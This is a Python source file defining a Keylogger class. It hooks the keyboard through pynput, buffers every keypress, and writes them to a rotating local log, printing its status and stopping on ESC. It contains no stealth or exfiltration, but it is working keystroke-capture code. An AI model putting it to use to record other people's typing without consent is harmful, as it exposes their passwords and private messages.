"""
core.py — The Keylogger class.

Responsibilities:
  - Register OS-level keyboard hooks via pynput
  - Buffer keystrokes in memory and flush to disk periodically
  - Delegate formatting and rotation to utils
"""

import threading
from pynput import keyboard

from .config import LOG_FILE, FLUSH_EVERY, ROTATE_KB, TIMESTAMP
from .utils  import key_label, ensure_logs_dir, session_header, rotate_if_needed


class Keylogger:
    """
    Captures keystrokes and writes them to a log file.

    Usage
    -----
    >>> logger = Keylogger()
    >>> logger.start()          # blocks until ESC is pressed
    """

    def __init__(
        self,
        log_file:    str  = LOG_FILE,
        flush_every: int  = FLUSH_EVERY,
        rotate_kb:   int  = ROTATE_KB,
        timestamp:   bool = TIMESTAMP,
    ) -> None:
        self.log_file    = log_file
        self.flush_every = flush_every
        self.rotate_kb   = rotate_kb

        self._buffer: list[str] = []
        self._lock   = threading.Lock()
        self._count  = 0

        ensure_logs_dir(self.log_file)

        if timestamp:
            self._write(session_header())

    # ── Private ────────────────────────────────────────────────────────────────

    def _write(self, text: str) -> None:
        """Write *text* directly to the log file (handles rotation first)."""
        rotate_if_needed(self.log_file, self.rotate_kb)
        with open(self.log_file, "a", encoding="utf-8") as fh:
            fh.write(text)

    def _flush(self) -> None:
        """Drain the in-memory buffer to disk."""
        with self._lock:
            if self._buffer:
                self._write("".join(self._buffer))
                self._buffer.clear()

    # ── pynput callbacks ───────────────────────────────────────────────────────

    def on_press(self, key) -> None:
        """Called by pynput for every key-down event."""
        label = key_label(key)

        with self._lock:
            self._buffer.append(label)
            self._count += 1

        if self._count % self.flush_every == 0:
            self._flush()

    def on_release(self, key) -> bool | None:
        """
        Called by pynput for every key-up event.
        Returning ``False`` stops the listener (triggered by ESC).
        """
        if key == keyboard.Key.esc:
            self._flush()
            print("\n[*] ESC pressed — stopping keylogger.")
            return False

    # ── Public ─────────────────────────────────────────────────────────────────

    def start(self) -> None:
        """Start listening for keystrokes (blocking)."""
        import os
        print(f"[*] Keylogger running  →  {os.path.abspath(self.log_file)}")
        print("[*] Press ESC to stop.\n")

        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release,
        ) as listener:
            listener.join()

        print(f"[*] Session ended. Log: {os.path.abspath(self.log_file)}")
